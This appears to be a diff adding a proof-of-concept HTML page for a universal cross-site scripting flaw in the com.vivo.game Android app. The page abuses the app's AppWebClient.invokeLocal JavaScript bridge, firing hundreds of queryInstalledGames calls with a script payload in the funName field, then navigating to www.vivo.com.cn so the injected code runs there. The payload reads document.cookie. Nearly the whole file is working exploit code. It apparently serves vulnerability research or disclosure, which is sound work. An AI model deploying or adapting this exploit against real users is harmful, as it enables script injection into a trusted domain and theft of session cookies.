@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>vivo game UXSS POC</title>
+</head>
+<body>
+<h2 style="font-size:16px">com.vivo.game JSBridge Async UXSS POC</h2>
+<pre id="log" style="font-size:11px"></pre>
+<script>
+
+var TARGET = "https://www.vivo.com.cn/";   
+
+var BRIDGE_OBJ    = "AppWebClient";              
+var BRIDGE_METHOD = "invokeLocal";              
+var CMD_QUERY     = "queryInstalledGames";       
+var KEY_FUNNAME   = "funName";                 
+
+var payload =
+    'setTimeout(function(){try{' +
+        'if(!window.__uxss){' +
+            'window.__uxss=1;' +
+            'alert("[UXSS] injected on " + document.domain + " | cookie=" + document.cookie);' +
+        '}' +
+    '}catch(_e){}},800);//';
+
+function log(msg) {
+    try {
+        var el = document.getElementById("log");
+        if (el) el.textContent += msg + "\n";
+    } catch(e) {}
+}
+
+function inject() {
+    try {
+        var param = JSON.stringify({info: {funName: payload}});
+        window[BRIDGE_OBJ][BRIDGE_METHOD](CMD_QUERY, param);
+        log("[*] fired " + CMD_QUERY + " info.funName=payload(" + payload.length + "B)");
+    } catch(e) {
+        log("[-] fire error: " + e.message);
+    }
+}
+
+var NAV_DELAY_MS = 100;
+
+for (var i = 0; i < 500; i++) {
+    setTimeout(inject, NAV_DELAY_MS + i * 2);
+}
+for (var j = 0; j < 200; j++) {
+    setTimeout(inject, 800 + j * 5);
+}
+
+setTimeout(function() {
+    log("[*] navigating to " + TARGET);
+    location.href = TARGET;
+}, NAV_DELAY_MS);
+</script>
+</body>
+</html>
